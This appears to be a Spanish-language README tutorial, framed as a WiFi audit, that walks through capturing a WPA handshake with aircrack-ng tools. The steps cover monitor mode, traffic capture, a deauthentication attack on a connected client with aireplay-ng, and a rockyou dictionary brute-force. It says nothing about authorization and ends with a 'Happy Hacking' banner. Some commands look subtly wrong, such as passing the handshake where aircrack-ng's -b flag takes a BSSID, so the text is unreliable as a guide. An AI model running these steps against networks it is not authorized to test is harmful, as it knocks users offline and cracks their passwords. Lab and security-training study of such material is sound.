# Auditorias de WIFI
Para este ejercicio de Auditoria Wifi, se implementara la tecnica que activa la antena Wifi en modo monitor, asi como el uso de herramientas que nos ayuden a monitorear y obtener los campos requeridos para lograr el objetivo.

## Herramienta 🛠️
* Aircrack-NG
* Rockyou : Diccionario

## Pasos para la Auditoria
1. Descargar el Diccionario Rockyou
2. Crear directorio de trabajo 

```bash
mkdir nuevoDir
```

3. Hubicar el diccionario(rockyou.txt) descargado en el directorio de trabajo.

```bash
mv rockyou.txt /nuevoDir
```

4. Dentro del directorio de trabajo, instalar "aircrack".

```bash
sudo apt install aircrack-ng
```

5. Poner la antena Wifi en modo monitor.
```bash
ifconfig
sudo airmon-ng start NombreInterfaz
```

6. Enlistar las redes Wifi alrededor.
```bash
sudo airodump-ng nombreInterfazMon
```

7. Obtener el BSSID y CH del Wifi a auditar.

8. Guardamos el trafico de la red para obtener luego datos a auditar. Aircrack espera en la red si un usuario navega para darnos informacion valiosa
```bash
sudo airodump-ng -c canalObtenido --bssid BSSIDobtenido -W nombreGuardar NombreInterfaz
```

9. Guardar el campo STATION que devuelva el monitoreo cuando un usuario navegue en la red (dejar corriendo la terminal monitoreando). OJO: no cerrarla

10. En una nueva terminal. Ejecutar el siguiente comando para enviarle trafico a la red Target. Este proceso se recomienda hacerlo de 2 a 3 veces hasta conseguir el dato de Handshake 
```bash
sudo aireplay-ng -0 9 -a BSSID -c STATION NombreInterfaz
```
Copiar el handshake que se obtiene en la terminar que esta monitoreando la red, durante el envio de paquetes. 


11. Terminar el proceso de monitorio y enlistar el directorio actual. Se vera como se crearon unos archivos con los datos monitoreados.

Para realizar el ataque final de fuerza bruta haremos uso del archivo con extension .cap generado.


12. Comando para realizar ataque de fuerza bruta.
```bash
sudo aircrack-ng -b Handshake -w rockyou.txt auditoria.cap 
```

13. Restablecer antena de modo monitoreo
```bash
sudo airmon-ng stop Interfaz
```

```bash
 _   _                           _   _            _    _             
| | | | __ _ _ __  _ __  _   _  | | | | __ _  ___| | _(_)_ __   __ _ 
| |_| |/ _` | '_ \| '_ \| | | | | |_| |/ _` |/ __| |/ / | '_ \ / _` |
|  _  | (_| | |_) | |_) | |_| | |  _  | (_| | (__|   <| | | | | (_| |
|_| |_|\__,_| .__/| .__/ \__, | |_| |_|\__,_|\___|_|\_\_|_| |_|\__, |
            |_|   |_|    |___/                                 |___/ 

```








